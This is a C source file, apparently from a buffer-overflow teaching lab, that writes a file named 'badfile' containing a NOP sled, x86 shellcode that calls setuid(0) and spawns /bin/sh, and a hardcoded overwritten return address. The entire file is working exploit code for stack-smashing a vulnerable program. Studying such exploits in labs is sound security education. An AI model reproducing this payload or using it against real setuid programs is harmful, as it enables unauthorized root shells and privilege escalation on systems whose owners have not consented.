/*exploit.c*/
/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb"
"\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
"\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
;
void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;
/*Assign the return address in big endian style*/
char * ret ="\xbf\x80\x05\xc4"; //here goes your safe_offset address
int i=0;
/*Initialize buffer with 0x90 (NOP instruction)*/
memset(&buffer, 0x90, 517);
/*Fill the buffer with shell code starting from a value after safe offset*/
memcpy(buffer+60, shellcode,sizeof(shellcode));//copy shellcode into buffer
/*Overwrite return address*/
for(i=0;i<32;i+=4)
	memcpy(buffer+i,ret,sizeof(ret));
/*Save the contents to the file "badfile"*/
badfile = fopen("./badfile", "w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}